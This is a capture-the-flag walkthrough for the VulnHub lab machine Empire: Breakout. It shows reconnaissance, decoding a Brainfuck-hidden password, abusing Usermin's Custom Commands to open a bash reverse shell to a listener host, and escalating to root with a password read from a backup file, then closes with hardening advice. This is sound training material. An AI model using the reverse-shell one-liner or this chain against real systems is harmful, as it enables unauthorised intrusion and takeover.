---
title: "Empire: Breakout"
tagline: "Brainfuck-obfuscated creds, Usermin command injection, and a backup-file password leak to root."
category: CTF
difficulty: Intermediate
platform: VulnHub
date: 2026-01-18
---

## 📋 Overview
This guide documents the complete penetration testing methodology for Empire: Breakout, from initial reconnaissance to privilege escalation and flag capture. A continuation of the LupinOne series, focused on a distinct set of exploitation techniques.

## 🎯 Objectives
- Identify the target system and open services
- Enumerate hidden credentials within web application source code
- Decode obfuscated strings to retrieve login credentials
- Exploit command injection for an initial low-privilege shell
- Escalate privileges using exposed backup files
- Capture both the user and root flags

## 1. Reconnaissance

```bash
$ ifconfig
$ nmap -sn 192.168.56.0/24
$ nmap -A 192.168.56.20
```

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s1.png" alt="ifconfig output"></p>
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s2.png" alt="Nmap ping sweep"></p>
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s3.png" alt="Nmap port scan"></p>

**Findings:**

| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | Apache httpd 2.4.51 (Debian) |
| 139 / 445 | SMB | Samba smbd 4 |
| 10000 | HTTP | MiniServ 1.981 (Webmin) |
| 20000 | HTTP | MiniServ 1.830 (Usermin) |

## 2. Web Enumeration & Credential Discovery

Viewing the page source (`Ctrl+U`) reveals a hidden comment containing **Brainfuck**-encoded data.

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s9.png" alt="Source code comment"></p>
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s10.png" alt="Decoding via Brainfuck interpreter"></p>

**Decoded string:** `.2uqPEf3jD<P`a-3`

## 3. Initial Web Login

Open Usermin on port `20000`. Enumeration via `enum4linux -U` reveals a valid local user, `cyber`.

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s6.png" alt="Usermin login portal"></p>
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s7.png" alt="Enum4Linux output"></p>
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s8.png" alt="Enum4Linux user cyber"></p>

Logging in with `cyber` and the decoded Brainfuck password succeeds.

## 4. Command Injection & Reverse Shell

Usermin's **Custom Commands** section executes system commands directly on the target.

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s11.png" alt="Usermin Custom Commands"></p>

```bash
$ nc -nlvp 999
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s12.png" alt="Netcat listener"></p>

```bash
$ bash -i >& /dev/tcp/192.168.56.12/999 0>&1
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s13.png" alt="Interactive shell as cyber"></p>

```bash
cyber@breakout:~$ python3 -c "import pty;pty.spawn('/bin/bash')"
cyber@breakout:~$ export TERM=xterm
```

## 5. User Flag

```bash
cyber@breakout:~$ cat user.txt
```
**User flag:** `3mp1r3{You_Manage_To_Break_To_My_Secure_Access}`

## 6. Privilege Escalation

```bash
cyber@breakout:~$ ls -alps /var/backups
```
<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s14.png" alt="Identifying .old_pass.bak"></p>

```bash
cyber@breakout:~$ cat /var/backups/.old_pass.bak
```
**Output:** `Ts&4&YurgtRX(==~h`

```bash
cyber@breakout:~$ su
```
Password: `Ts&4&YurgtRX(==~h`

<p align="center"><img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s16.png" alt="Escalating to root"></p>

## 7. Root Flag

```bash
root@breakout:/root# cat r00t.txt
```

🎉 **Root access achieved — flag captured!**

## 🔒 Security Recommendations
- **Source Code Hygiene** — never embed encoded credentials in client-side source
- **Web Application Restrictions** — disable "Custom Commands" in Usermin/Webmin for unprivileged users
- **Backup File Protection** — never store plaintext passwords in backup files
- **User Enumeration** — disable SMB null-session enumeration
- **Password Rotation** — enforce strict rotation for admin accounts

## 🔧 Tools Used
`ifconfig` · `nmap` · `enum4linux` · Brainfuck Interpreter · `netcat` · Python3 · `cat` · `ls` · `sudo` · `su`
